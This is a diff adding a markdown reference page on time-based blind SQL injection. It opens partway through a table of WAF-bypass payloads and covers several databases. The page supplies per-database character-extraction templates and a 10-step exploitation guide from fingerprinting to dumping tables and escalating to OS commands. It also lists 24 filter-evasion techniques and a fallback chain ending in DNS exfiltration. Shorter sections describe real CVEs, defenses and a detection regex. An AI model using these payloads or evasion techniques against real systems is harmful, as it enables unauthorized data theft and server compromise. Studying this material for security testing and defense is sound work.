+| 81 | Hex encoding | \`'; SET @s=0x534C45455028352900; PREPARE stmt FROM @s; EXECUTE stmt;-- -\` | Literal string matching |
+| 82 | Variable-based delay | \`'; SET @d=5; SELECT SLEEP(@d);-- -\` | Numeric literal detection |
+| 83 | WAITFOR string concat | \`'; WAITFOR DELAY '0:0:'+CHAR(53);-- -\` | WAITFOR argument filter |
+| 84 | Whitespace alternatives | \`'%09OR%09SLEEP(5)-- -\` | Space-based tokenization |
+| 85 | Case variation | \`' AnD sLeEp(5)-- -\` | Case-sensitive patterns |
+| 86 | URL encoding | \`%53LEEP(5)\` or \`%53%4C%45%45%50(5)\` | Literal keyword match |
+| 87 | Double URL encoding | \`%2553LEEP(5)\` | Single-decode WAFs |
+| 88 | Keyword nesting | \`SLSLEEP(10)EEP(10)\` | Single-pass strip |
+| 89 | HTTP Parameter Pollution | \`/?id=1;WAITFOR/*&id=*/DELAY '0:0:5'--\` | Per-parameter inspection |
+| 90 | Chunked Transfer | Split payload across chunks | Chunk-unaware WAFs |
+| 91 | JSON operator bypass | \`' AND JSON_EXTRACT('{"a":1}','$.a')=1 AND SLEEP(5)-- -\` | JSON-unaware WAFs (Claroty Team82) |
+| 92 | PostgreSQL JSON bypass | \`' AND '{"b":2}'::jsonb <@ '{"a":1,"b":2}'::jsonb AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--\` | JSON containment operator |
+| 93 | MSSQL JSON bypass | \`'; IF JSON_VALUE('{"a":"1"}','$.a')='1' WAITFOR DELAY '0:0:5'--\` | JSON function (SQL Server 2016+) |
+| 94 | Scientific notation | \`' OR 1e0AND SLEEP(5)-- -\` | Whitespace-based parsing |
+| 95 | GET_LOCK bypass | \`' OR GET_LOCK('sqli_lock', 5)-- -\` | Delay function filters |
+| 96 | ELT/FIELD function | \`' OR SLEEP(FIELD(SUBSTRING(@@version,1,1),'4','5','6','7','8'))-- -\` | Conditional logic filters |
+| 97 | PREPARE/EXECUTE from hex | \`'; SET @s=CONCAT('SL','EE','P(5)'); PREPARE stmt FROM @s; EXECUTE stmt;-- -\` | Static function name detection |
+| 98 | Encoding chains | \`' OR SLEEP(CAST(X'35' AS UNSIGNED))-- -\` | Numeric argument detection |
+| 99 | Unicode normalization | \`' OR SLEEP(5)-- -\` (with U+02BC instead of U+0027) | ASCII-only matching |
+
+### Binary Search Templates (5 -- one per DB)
+
+**MySQL:**
+\`\`\`sql
+' AND IF(ASCII(SUBSTRING(({subquery}),{position},1))>{midpoint}, SLEEP({delay}), 0)-- -
+\`\`\`
+
+**PostgreSQL:**
+\`\`\`sql
+'; SELECT CASE WHEN ASCII(SUBSTRING(({subquery}),{position},1))>{midpoint} THEN pg_sleep({delay}) ELSE pg_sleep(0) END--
+\`\`\`
+
+**MSSQL:**
+\`\`\`sql
+'; IF ASCII(SUBSTRING(({subquery}),{position},1))>{midpoint} WAITFOR DELAY '0:0:{delay}'--
+\`\`\`
+
+**Oracle:**
+\`\`\`sql
+AND 1=(SELECT CASE WHEN ASCII(SUBSTR(({subquery}),{position},1))>{midpoint} THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{delay}) ELSE 1 END FROM dual)
+\`\`\`
+
+**SQLite:**
+\`\`\`sql
+AND CASE WHEN UNICODE(SUBSTR(({subquery}),{position},1))>{midpoint} THEN LIKE('A',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END
+\`\`\`
+
+---
+
+## Exploitation (10 Steps)
+
+### Step 1: Identify Injection Point
+
+Test all parameters with unconditional delays. Watch for response time anomalies.
+
+### Step 2: Confirm Conditional Logic
+
+Send TRUE (should delay) and FALSE (should not delay) conditions. Both must behave as expected.
+
+### Step 3: Fingerprint Database Engine
+
+Inject database-specific delay functions. The one that delays reveals the backend:
+
+\`\`\`sql
+SLEEP(5)            -- MySQL (delays = MySQL)
+WAITFOR DELAY       -- MSSQL (delays = SQL Server)
+pg_sleep(5)         -- PostgreSQL (delays = PostgreSQL)
+DBMS_PIPE.RECEIVE_MESSAGE  -- Oracle (delays = Oracle)
+RANDOMBLOB chain    -- SQLite (delays = SQLite)
+\`\`\`
+
+### Step 4: Determine Current User
+
+\`\`\`sql
+-- MySQL: extract user() character by character
+IF(ASCII(SUBSTRING(user(),{pos},1))>{mid}, SLEEP(5), 0)
+
+-- PostgreSQL: extract current_user
+CASE WHEN ASCII(SUBSTRING(current_user,{pos},1))>{mid} THEN pg_sleep(5) ELSE pg_sleep(0) END
+
+-- MSSQL: extract SYSTEM_USER
+IF ASCII(SUBSTRING(SYSTEM_USER,{pos},1))>{mid} WAITFOR DELAY '0:0:5'
+\`\`\`
+
+### Step 5: Enumerate Database Names
+
+\`\`\`sql
+-- MySQL
+IF(ASCII(SUBSTRING(DATABASE(),{pos},1))>{mid}, SLEEP(5), 0)
+
+-- PostgreSQL
+CASE WHEN ASCII(SUBSTRING(current_database(),{pos},1))>{mid} THEN pg_sleep(5) ELSE pg_sleep(0) END
+
+-- MSSQL
+IF ASCII(SUBSTRING(DB_NAME(),{pos},1))>{mid} WAITFOR DELAY '0:0:5'
+\`\`\`
+
+### Step 6: Enumerate Table Names
+
+\`\`\`sql
+-- MySQL
+IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {n},1),{pos},1))>{mid}, SLEEP(5), 0)
+
+-- PostgreSQL
+CASE WHEN ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {n}),{pos},1))>{mid} THEN pg_sleep(5) ELSE pg_sleep(0) END
+
+-- MSSQL
+IF ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),{pos},1))>{mid} WAITFOR DELAY '0:0:5'
+\`\`\`
+
+### Step 7: Enumerate Column Names
+
+\`\`\`sql
+-- MySQL
+IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {n},1),{pos},1))>{mid}, SLEEP(5), 0)
+\`\`\`
+
+### Step 8: Extract Data Values
+
+\`\`\`sql
+-- MySQL
+IF(ASCII(SUBSTRING((SELECT {column} FROM {table} LIMIT {row},1),{pos},1))>{mid}, SLEEP(5), 0)
+\`\`\`
+
+### Step 9: Check Privileges
+
+\`\`\`sql
+-- MySQL FILE_PRIV
+IF(MID((SELECT file_priv FROM mysql.user WHERE user='root'),1,1)='Y', SLEEP(5), 0)
+
+-- MSSQL sysadmin role
+IF (SELECT IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'
+\`\`\`
+
+### Step 10: Escalate (if applicable)
+
+If database user has elevated privileges:
+- **MSSQL:** Enable \`xp_cmdshell\` for OS command execution
+- **PostgreSQL:** Use \`COPY TO PROGRAM\` for OS commands
+- **MySQL:** Use \`INTO OUTFILE\` for file writes
+- **Oracle:** Use \`UTL_FILE\` or \`Java\` stored procedures
+
+---
+
+## Post-Exploitation
+
+### Extraction Optimization
+
+- **Binary search:** 7 requests per character vs 96 for linear search
+- **Bitwise extraction:** 7 independent requests per character, parallelizable
+- **Character-set detection:** If data is known to be hex (passwords), narrow search space from 128 to 16 values (~4 requests per character)
+- **Hakuin ML optimization:** 3-26x fewer requests than standard binary search
+
+### Parallel Extraction
+
+- **Position-level:** Extract positions 1, 2, 3, ... N simultaneously on separate connections
+- **Bit-level:** Extract all 7 bits of a character in one round (7 parallel requests)
+- **HTTP/2 multiplexed batch:** Pack 50-100 probes into a single HTTP/2 connection
+
+### Full Database Dump Timing Estimates
+
+| Target | Characters | Binary Search (5s) | Binary Search (2s) | Hakuin (2s) |
+|--------|-----------|-------------------|-------------------|-------------|
+| 20-char password | 140 requests | ~12 min | ~5 min | ~1 min |
+| 10 table names (avg 12 chars) | 840 requests | ~70 min | ~28 min | ~8 min |
+| 100 rows x 3 cols x 20 chars | 42,000 requests | ~58 hours | ~23 hours | ~7 hours |
+| Full schema + 1000 rows | ~200,000 requests | ~12 days | ~5 days | ~1.5 days |
+
+---
+
+## Detection Evasion
+
+### 24 WAF Bypass Techniques for Time Functions
+
+1. **BENCHMARK substitution** -- Replace \`SLEEP()\` with \`BENCHMARK(10000000, MD5('x'))\` (MySQL)
+2. **MySQL version comments** -- \`/*!50000SLEEP*/(5)\` executes only on MySQL >= 5.0
+3. **CASE WHEN instead of IF** -- Universal SQL, avoids \`IF(\` pattern matching
+4. **Inline comment injection** -- \`SL/**/EEP(5)\` breaks regex keyword detection
+5. **Hex encoding** -- Build \`SLEEP(5)\` from hex via \`PREPARE/EXECUTE\`
+6. **Variable-based delay** -- \`SET @d=5; SELECT SLEEP(@d)\` hides delay value
+7. **Stacked WAITFOR** -- Separate delay into second statement (MSSQL)
+8. **pg_sleep alternatives** -- \`pg_sleep_for('5 seconds')\` or \`GENERATE_SERIES\` (PostgreSQL)
+9. **DNS-based timing (OAST)** -- Out-of-band DNS resolution as timing channel
+10. **CPU-intensive operations** -- SHA2/MD5 chain, string repetition, mathematical chains
+11. **GET_LOCK / IS_FREE_LOCK** -- Named lock blocking (MySQL, rarely filtered)
+12. **ELT / FIELD / MAKE_SET** -- Alternative conditional functions (MySQL)
+13. **JSON-based bypass** -- \`JSON_EXTRACT\` tautology + delay (Claroty Team82, 2022)
+14. **Unicode normalization** -- Homoglyph apostrophes (U+02BC) normalized to ASCII
+15. **Scientific notation** -- \`1e0AND SLEEP(5)\` as whitespace alternative (MySQL)
+16. **HTTP Parameter Pollution** -- Split payload across duplicate parameters
+17. **Chunked Transfer Encoding** -- Split payload across HTTP chunks
+18. **Double URL encoding** -- \`%2553LEEP(5)\` bypasses single-decode WAFs
+19. **HTTP/2 pseudo-header injection** -- Null byte or encoding in \`:path\`
+20. **PREPARE/EXECUTE from hex** -- Build function name dynamically at runtime
+21. **HANDLER statement** -- MySQL-specific direct table access (rarely inspected)
+22. **Encoding chains** -- \`SLEEP(CAST(X'35' AS UNSIGNED))\` hides delay argument
+23. **Whitespace alternatives** -- \`%09\` (tab), \`%0a\` (newline), \`%a0\` (NBSP), \`()\` as separator
+24. **Nested/multiline comments** -- \`'OR/* long benign comment */SLEEP(5)-- -\`
+
+---
+
+## Variations & Edge Cases
+
+### Fallback Chain: When Delay Functions Are Blocked
+
+\`\`\`
+1. SLEEP() blocked?
+   -> Try BENCHMARK(10000000, SHA1('x'))
+2. BENCHMARK() also blocked?
+   -> Try GET_LOCK('lock', 5) (requires concurrent session)
+3. GET_LOCK() unavailable?
+   -> Try heavy query: (SELECT COUNT(*) FROM info_schema.columns A, info_schema.columns B, info_schema.columns C)
+4. Heavy query filtered?
+   -> Try recursive CTE: WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r WHERE n < 5000000)
+5. All blocked?
+   -> Switch to out-of-band (DNS exfiltration via LOAD_FILE UNC path on Windows)
+\`\`\`
+
+### Oracle: No Stacked Queries
+
+Oracle does NOT support stacked queries in standard SQL injection contexts. This means \`DBMS_LOCK.SLEEP()\` and \`DBMS_SESSION.SLEEP()\` (which require PL/SQL blocks) cannot be injected in most scenarios. \`DBMS_PIPE.RECEIVE_MESSAGE()\` is the primary usable function because it works as an expression in a single SQL statement. When \`DBMS_PIPE\` is unavailable (privileges), heavy queries via \`CONNECT BY\` or Cartesian products on \`all_objects\` are the ONLY option.
+
+### SQLite: No Native Delay
+
+SQLite has no \`SLEEP()\` function. All delays use computationally expensive operations. \`RANDOMBLOB(N)\` combined with \`HEX()\`, \`UPPER()\`, and \`LIKE()\` is the standard technique. \`RANDOMBLOB(500000000/2)\` generates 250MB of random data, \`HEX()\` doubles it to ~500MB of hex string, \`UPPER()\` processes the entire string, and \`LIKE()\` performs pattern matching on this massive string. The combined CPU and memory load creates a 3-10 second delay depending on hardware. Use \`--time-sec=10\` with sqlmap for SQLite targets.
+
+### Async/Queued Processing
+
+Some modern architectures process database queries asynchronously. The HTTP response returns immediately (200 OK within milliseconds), and the actual database query runs in a background worker. In this case, the injected \`SLEEP()\` executes in the background but the attacker sees no delay in the HTTP response. Time-based blind injection is **impossible** against these endpoints. Switch to out-of-band (DNS/HTTP exfiltration) or boolean-based techniques.
+
+### CDN/Load Balancer Timing Interference
+
+CDNs and load balancers add unpredictable latency layers. Requests may be routed to different backend servers with different response times. Mitigation:
+- Use cache-buster parameters to ensure each request reaches the origin
+- Increase delay to overcome CDN-added variance
+- Use \`X-Cache-Status\` header to verify cache misses
+- If CDN caching is aggressive, inject unique comments or tautologies per request
+
+### Connection Pooling Effects
+
+Connection pools reuse database connections. The first request in a new connection may be slower (connection setup), and subsequent requests faster. This creates a "warm-up" period that can produce false positives. Mitigation:
+- Send 3-5 warm-up requests before extraction begins
+- Use persistent HTTP connections (keep-alive or HTTP/2)
+- Recalibrate baseline periodically during long extraction sessions
+
+### Backend Query Amplification
+
+Some backends execute the injected query multiple times internally. CVE-2025-32993 (Vision Helpdesk) demonstrated that a \`SLEEP(6)\` payload produced a ~12-second response -- the backend executed the query twice. This means the observed delay may be 2x or more of the injected delay. Always use conditional TRUE/FALSE comparison rather than fixed thresholds.
+
+---
+
+## Modern Stack Specifics
+
+### Serverless Cold Starts
+
+AWS Lambda, Azure Functions, and GCP Cloud Functions exhibit "cold start" latency when a function instance has not been invoked recently. A cold start can add 1-10 seconds to response time, creating massive false positives for time-based injection. Mitigation:
+- Send 5-10 warm-up requests before testing (force a warm start)
+- Recalibrate baseline frequently (Lambda recycles instances)
+- Use longer delays (10+ seconds) to differentiate from cold start latency
+- Compare TRUE vs FALSE conditions rather than absolute timing
+
+### Connection Pooling in Modern Frameworks
+
+ORMs like SQLAlchemy, Hibernate, and ActiveRecord use connection pooling. Pool exhaustion can cause queued requests to wait for an available connection, adding seconds of latency unrelated to injection. Mitigation:
+- Test during low-traffic periods
+- Use single-threaded extraction (1 request at a time)
+- Monitor connection pool metrics if possible
+
+### Async Frameworks (Node.js, FastAPI, Go)
+
+Async web frameworks (Express.js with async/await, FastAPI, Go goroutines) may not block the event loop while waiting for a database query. The \`SLEEP()\` executes on the database side, and the async framework awaits the result. Time-based injection still works here because the HTTP response is held until the database query completes. However, if the framework uses query timeouts (e.g., \`statement_timeout\` in PostgreSQL), the query may be killed before the delay completes. Calibrate delay below the query timeout.
+
+### Microservice Architectures
+
+In microservice architectures, the injectable parameter may pass through multiple services before reaching the database. Each hop adds latency and variance. The effective delay is the injected delay plus N hops of inter-service communication. Baseline measurement is critical to account for this overhead.
+
+### GraphQL and Batched Queries
+
+GraphQL resolvers may execute multiple database queries per request. If the injection is in one resolver, the delay only affects that resolver's query, but the total response time includes all resolvers. The effective signal may be diluted. Use longer delays to overcome the noise from parallel resolver execution.
+
+---
+
+## Real-World Examples
+
+### 10 Non-WordPress Enterprise CVEs
+
+> **Cross-reference note:** CVE-2023-48788 (FortiClientEMS) and CVE-2023-34362 (MOVEit Transfer) also appear on the [Error-Based SQL Injection](02-Error-Based.md) and [Classic In-Band SQL Injection](01-Classic-In-Band.md) pages respectively. Both vulnerabilities support multiple exploitation techniques. The entries here document their **time-based blind** exploitation specifically -- WAITFOR DELAY confirmation and timing-based extraction chains.
+
+| CVE | Product | CVSS | Auth | DB | Time-Based Technique |
+|-----|---------|------|------|----|--------------------|
+| CVE-2024-43468 | Microsoft SCCM | 9.8 | None | MSSQL | WAITFOR DELAY in MP_Location service; xp_cmdshell to RCE as sysadmin |
+| CVE-2024-22120 | Zabbix Server | 9.1 | Low | PostgreSQL | pg_sleep in unsanitized \`clientip\` audit log field; full DB dump -> admin -> RCE |
+| CVE-2024-8924 | ServiceNow Now Platform | 7.5 | None | Proprietary | Blind SQLi with time-based + boolean inference; credential extraction from ITSM |
+| CVE-2023-48788 | Fortinet FortiClientEMS | 9.8 | None | MSSQL | WAITFOR DELAY '00:00:10' confirmed by Horizon3.ai; binary protocol on port 8013 |
+| CVE-2025-25257 | Fortinet FortiWeb | 9.8 | None | MySQL | SQLi in Authorization Bearer header; a WAF product vulnerable to SQL injection |
+| CVE-2023-45684 | CFEngine Enterprise | 7.5 | None | PostgreSQL | PG_SLEEP in Mission Portal login page; credential extraction from IT management |
+| CVE-2025-24799 | GLPI ITSM | 9.8 | None | MySQL | Time-based blind via \`deviceid\` in inventory endpoint; admin credential extraction |
+| CVE-2024-32461 | LibreNMS | 8.8 | Low | MySQL | SLEEP in \`package\` parameter search; password hash extraction from monitoring |
+| CVE-2025-32993 | Vision Helpdesk | Pending | None | MySQL | SLEEP(6) in Forgot Password \`vis_username\`; ~12s response (backend amplification) |
+| CVE-2023-34362 | MOVEit Transfer (Cl0p) | 9.8 | None | MSSQL | Zero-day mass exploitation; 2,500+ orgs, 94M records, $15B damages |
+
+### Key Patterns Across CVEs
+
+1. **8/10 CVEs require no authentication.** Time-based blind SQLi overwhelmingly appears on unauthenticated attack surfaces.
+2. **Enterprise infrastructure is the primary target class.** SCCM, Zabbix, ServiceNow, FortiWeb, CFEngine -- management planes of enterprise networks.
+3. **SQL injection in non-web protocols.** CVE-2023-48788 was in a binary C++/Golang protocol on port 8013. CVE-2024-22120 was in audit log processing, not user-facing input.
+4. **WAF products are not immune.** CVE-2025-25257: FortiWeb, a WAF appliance, had pre-auth SQLi in its own authentication code.
+5. **Time-based blind is the gateway to RCE.** In 5/10 CVEs, SQLi was chained to OS command execution via xp_cmdshell, file writes, or privilege escalation.
+
+### 6 Bug Bounty & Technical Writeups
+
+1. **Horizon3.ai -- FortiClientEMS Deep Dive (CVE-2023-48788):** Reverse-engineered binary protocol, injected \`WAITFOR DELAY\` via FCTUID parameter, bypassed query uppercasing with MSSQL \`CONVERT()\` on hex-encoded payloads. RCE as NT AUTHORITY\\SYSTEM. [Link](https://horizon3.ai/attack-research/attack-blogs/cve-2023-48788-fortinet-forticlientems-sql-injection-deep-dive/)
+
+2. **WatchTowr Labs -- FortiWeb Pre-Auth SQLi to RCE (CVE-2025-25257):** Injected via Authorization Bearer header in Fabric Connector. MySQL \`INTO OUTFILE\` wrote Python .pth file to site-packages, executing as root. A WAF compromised through the vulnerability it prevents. [Link](https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/)
+
+3. **Marx Chryz Del Mundo -- First Critical Bug ($3,500):** Time-based blind SQLi in ORDER BY clause. \`(select*from(select(sleep(10)))a)\` bypassed ORDER BY restrictions. MySQL 5.7.31 fingerprinted via version comments. [Link](https://marxchryz.medium.com/my-bug-bounty-journey-and-my-first-critical-bug-time-based-blind-sql-injection-aa91d8276e41)
+
+4. **Nav1n0x -- Vision Helpdesk (CVE-2025-32993):** Unauthenticated SQLi in Forgot Password. \`SLEEP(6)\` produced 12-second response (backend amplification). Vendor non-responsive, all versions remain unpatched. [Link](https://nav1n.medium.com/sql-injection-in-vision-helpdesk-tools-a83dfc27f3ab)
+
+5. **Priyanshu Shakya -- Super Blind SQLi ($20,000):** When time-based payloads fail, use OAST (out-of-band). Applications save parameters to analytics databases, triggering delayed DNS interactions from backend processing. [Link](https://medium.com/@pranshux0x/super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable-f9b013765448)
+
+6. **HackerOne #2759243 -- U.S. Department of Defense:** WAITFOR DELAY injection confirmed blind SQLi on government infrastructure. October 2024 via VDP. [Link](https://hackerone.com/reports/2759243)
+
+### 3 Conference Talks
+
+1. **James Kettle -- "Listen to the Whispers: Web Timing Attacks That Actually Work" (Black Hat USA 2024, DEF CON 32):** 200-microsecond detection via HTTP/2 single-packet attack. Bottom-quartile comparison of 30 measurements. Tested against 30,000 websites. Detected fully blind SQLi via \`'\` vs \`''\` sub-millisecond differentials. [Slides](https://i.blackhat.com/BH-US-24/Presentations/US-24-Kettle-Listen-to-the-whispers-web-timing-attacks-that-actually-work.pdf) | [Paper](https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work)
+
+2. **Pruzinec & Nguyen -- "Hakuin: Injecting Brains Into Blind SQL Injection" (HITBSecConf 2023, HITB inCyber 2024):** 6x faster schema extraction, 26x faster on constrained columns via probabilistic language models. IEEE SPW 2023 published. [GitHub](https://github.com/pruzko/hakuin)
+
+3. **David Caissy -- "Advanced Blind SQL Injection" (DEF CON 24 Workshop):** Binary search optimization, database-specific timing functions, practical extraction methodologies. [Materials](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20workshops/DEF%20CON%2024%20-%20Workshop-David-Caissy-Advanced-Blind-SQL-Injection.pdf)
+
+### 2 Real-World Breaches
+
+1. **MOVEit Transfer Mass Exploitation (CVE-2023-34362, May-June 2023):** Cl0p ransomware gang exploited unauthenticated SQLi as zero-day. Deployed LEMURLOOT web shell for persistence. 2,500+ organizations compromised, 94+ million records exposed, $15+ billion estimated damages. Notable victims: US DOE, Johns Hopkins, BBC, British Airways, Shell, Ernst & Young. 10-day active exploitation window before widespread patching. Largest single SQL injection breach campaign in history.
+
+2. **ResumeLooters Campaign (Nov-Dec 2023):** Automated SQL injection (sqlmap) and XSS against 65 job recruitment and retail websites. 2,079,027 unique email addresses plus PII stolen. Asia-Pacific focus (India, Taiwan, Thailand, Vietnam). Data sold via Telegram. Demonstrates SQLi remains the bread-and-butter attack for mass data theft using freely available tools.
+
+---
+
+## Skill Progression Path
+
+| Level | Skill | Key Activity | Time Estimate |
+|-------|-------|-------------|---------------|
+| 0 | Conceptual | Understand timing as information channel | 2 hours |
+| 1 | Basic Confirmation | Inject unconditional SLEEP, observe delay | 1 day |
+| 2 | Manual Extraction | Extract data via conditional delay + binary search | 1 week |
+| 3 | Tool Automation | Use sqlmap \`--technique=T\` for full dumps | 2 weeks |
+| 4 | Heavy Queries | Exploit targets where SLEEP is blocked | 1 month |
+| 5 | WAF Bypass | Apply 24 evasion techniques against real WAFs | 2 months |
+| 6 | Advanced Timing | HTTP/2 single-packet, Timeless Timing, Hakuin | 3+ months |
+| 7 | Custom Tooling | Build adaptive TimingOracle with statistical analysis | Ongoing |
+
+**Recommended practice path:**
+1. PortSwigger Lab: "Blind SQL injection with time delays" (unconditional delay)
+2. PortSwigger Lab: "Blind SQL injection with time delays and information retrieval" (full extraction)
+3. sqlmap \`--technique=T\` against deliberately vulnerable apps (DVWA, SQLi-labs)
+4. Write a custom Python extraction script using the TimingOracle class
+5. Practice heavy query techniques against SQLite targets (no native SLEEP)
+6. Study Kettle's "Listen to the Whispers" paper and practice with Turbo Intruder
+
+---
+
+## Defensive Countermeasures
+
+### Primary Defense: Parameterized Queries
+
+The only complete prevention. Separates SQL structure from data values at the database driver level.
+
+\`\`\`python
+# VULNERABLE
+query = f"SELECT * FROM users WHERE id = '{user_input}'"
+
+# SECURE (parameterized)
+query = "SELECT * FROM users WHERE id = %s"
+cursor.execute(query, (user_input,))
+\`\`\`
+
+### Secondary Defenses
+
+| Defense | Effectiveness | Limitation |
+|---------|--------------|-----------|
+| Parameterized queries | Complete | Must cover ALL queries |
+| Input validation (strict allowlist) | High | Cannot allowlist all legitimate inputs |
+| WAF rules (SLEEP, WAITFOR, pg_sleep) | Medium | Bypassed by 24+ evasion techniques |
+| Query execution time limits | Medium | May break legitimate slow queries |
+| Rate limiting | Medium | Slows but does not prevent extraction |
+| Least-privilege DB accounts | Medium | Limits post-exploitation, not injection |
+| Connection pool timeouts | Low | Adds noise but does not prevent |
+| Error suppression | None | Time-based requires no errors |
+
+### Detection Signatures
+
+**Behavioral detection:**
+- Monitor for anomalous latency patterns per endpoint
+- Flag responses exceeding 5x baseline: \`if response_time > baseline * 5\`
+- Detect repeated requests to same endpoint with minor parameter variations and consistent delay intervals
+
+**Payload pattern detection (regex):**
+\`\`\`regex
+(?i)(sleep\\s*\\(|pg_sleep\\s*\\(|waitfor\\s+delay|benchmark\\s*\\(|dbms_pipe\\.receive_message|randomblob\\s*\\()
+\`\`\`
+
+**Fixed-value clustering:**
+Attackers use round delay values (1s, 3s, 5s, 10s). Response times clustered around these exact values indicate injection probing. Normal traffic shows continuous, varied distribution.
+
+---
+
+## References
+
+### Standards & Taxonomies
+- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
+- [CAPEC-7: Blind SQL Injection](https://capec.mitre.org/data/definitions/7.html)
+- [OWASP A05:2025 Injection](https://owasp.org/Top10/A03_2021-Injection/)
+
+### PortSwigger
+- [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
+- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [Lab: Blind SQLi with Time Delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
+- [Lab: Blind SQLi with Time Delays and Information Retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
+- [Listen to the Whispers: Web Timing Attacks That Actually Work](https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work)
+- [The Single-Packet Attack](https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local)
+
+### OWASP Testing Guides
+- [WSTG: Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
+- [WSTG: Testing for SQL Server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server)
+- [WSTG: Testing for MySQL](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL)
+
+### Research Papers & Talks
+- [Kettle -- Listen to the Whispers (Black Hat USA 2024 Slides)](https://i.blackhat.com/BH-US-24/Presentations/US-24-Kettle-Listen-to-the-whispers-web-timing-attacks-that-actually-work.pdf)
+- [Van Goethem et al. -- Timeless Timing Attacks (USENIX Security 2020)](https://www.usenix.org/conference/usenixsecurity20/presentation/van-goethem)
+- [Pruzinec & Nguyen -- Hakuin: Optimizing Blind SQLi (IEEE SPW 2023)](https://ieeexplore.ieee.org/document/10188624/)
+- [Caissy -- Advanced Blind SQL Injection (DEF CON 24)](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20workshops/DEF%20CON%2024%20-%20Workshop-David-Caissy-Advanced-Blind-SQL-Injection.pdf)
+- [Alonso & Parada -- Heavy Queries (DEF CON 16)](https://www.defcon.org/images/defcon-16/dc16-presentations/alonso-parada/defcon-16-alonso-parada-wp.pdf)
+- [Claroty Team82 -- JSON-Based WAF Bypass (2022)](https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf)
+
+### Payload Repositories
+- [PayloadsAllTheThings -- MySQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
+- [PayloadsAllTheThings -- PostgreSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
+- [PayloadsAllTheThings -- MSSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
+- [PayloadsAllTheThings -- Oracle](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
+- [PayloadsAllTheThings -- SQLite](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
+- [Advanced SQL Injection Cheatsheet (kleiton0x00)](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)
+
+### Tools
+- [sqlmap](https://github.com/sqlmapproject/sqlmap) -- \`--technique=T\` for time-based
+- [Hakuin](https://github.com/pruzko/hakuin) -- ML-optimized blind extraction
+- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder) -- HTTP/2 timing attacks
+- [Ghauri](https://github.com/r0oth3x49/ghauri) -- WAF bypass specialist
+
+### CVEs
+- [CVE-2024-43468 -- Microsoft SCCM (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2024-43468)
+- [CVE-2024-22120 -- Zabbix Server (CVSS 9.1)](https://nvd.nist.gov/vuln/detail/CVE-2024-22120)
+- [CVE-2024-8924 -- ServiceNow (CVSS 7.5)](https://nvd.nist.gov/vuln/detail/CVE-2024-8924)
+- [CVE-2023-48788 -- FortiClientEMS (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2023-48788)
+- [CVE-2025-25257 -- FortiWeb (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-25257)
+- [CVE-2023-45684 -- CFEngine Enterprise (CVSS 7.5)](https://nvd.nist.gov/vuln/detail/CVE-2023-45684)
+- [CVE-2025-24799 -- GLPI ITSM (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-24799)
+- [CVE-2024-32461 -- LibreNMS (CVSS 8.8)](https://nvd.nist.gov/vuln/detail/CVE-2024-32461)
+- [CVE-2025-32993 -- Vision Helpdesk (Pending)](https://nvd.nist.gov/vuln/detail/CVE-2025-32993)
+- [CVE-2023-34362 -- MOVEit Transfer (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2023-34362)
+
+### Bug Bounty Writeups
+- [Horizon3.ai -- FortiClientEMS Deep Dive](https://horizon3.ai/attack-research/attack-blogs/cve-2023-48788-fortinet-forticlientems-sql-injection-deep-dive/)
+- [WatchTowr -- FortiWeb Pre-Auth SQLi to RCE](https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/)
+- [Marx Chryz -- Time-Based Blind SQLi ($3,500)](https://marxchryz.medium.com/my-bug-bounty-journey-and-my-first-critical-bug-time-based-blind-sql-injection-aa91d8276e41)
+- [Nav1n0x -- Vision Helpdesk SQLi](https://nav1n.medium.com/sql-injection-in-vision-helpdesk-tools-a83dfc27f3ab)
